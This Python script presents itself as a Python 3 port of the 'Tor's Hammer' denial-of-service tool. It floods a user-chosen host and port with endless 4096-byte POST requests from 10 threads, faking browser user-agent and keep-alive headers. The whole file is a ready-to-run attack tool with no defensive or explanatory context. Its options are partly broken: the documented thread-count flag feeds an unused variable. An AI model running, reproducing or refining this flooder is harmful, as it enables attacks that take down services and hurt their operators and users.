#!/usr/bin/env python3
# Tor's Hammer - Python3 version
# Original: https://github.com/dotfighter/torshammer

import sys, threading, random, time, socket
import http.client as httplib
import urllib.parse as urlparse

# Terminal formatting (safe fallback if unavailable)
class term:
    BOL = ''
    UP = ''
    CLEAR_EOL = ''
    NORMAL = ''

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)"
]

headers = {
    "User-Agent": random.choice(user_agents),
    "Cache-Control": "no-cache",
    "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
    "Keep-Alive": "115",
    "Connection": "keep-alive",
    "Host": ""
}

def usage():
    print("\nUsage: python3 torshammer.py -t <target> [-p <port>] [-r <threads>]\n")
    sys.exit(1)

def attack(target, port, reqs):
    parsed = urlparse.urlparse(target)
    host = parsed.netloc if parsed.netloc else target
    headers["Host"] = host

    print(f"[+] Attack started on {host}:{port} with {reqs} requests/thread")

    while True:
        try:
            conn = httplib.HTTPConnection(host, port, timeout=10)
            conn.request("POST", "/", "X" * 4096, headers)
            response = conn.getresponse()
            conn.close()
        except Exception as e:
            pass

def main():
    if len(sys.argv) < 3:
        usage()

    target = None
    port = 80
    reqs = 256

    # Parse arguments
    for i in range(1, len(sys.argv)):
        if sys.argv[i] == "-t" and i + 1 < len(sys.argv):
            target = sys.argv[i+1]
        elif sys.argv[i] == "-p" and i + 1 < len(sys.argv):
            port = int(sys.argv[i+1])
        elif sys.argv[i] == "-r" and i + 1 < len(sys.argv):
            reqs = int(sys.argv[i+1])

    if not target:
        usage()

    # Start threads
    for i in range(10):
        t = threading.Thread(target=attack, args=(target, port, reqs))
        t.daemon = True
        t.start()

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
